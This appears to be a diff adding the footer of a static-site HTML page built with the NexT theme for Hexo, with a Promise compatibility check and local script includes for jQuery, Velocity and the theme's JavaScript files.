+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
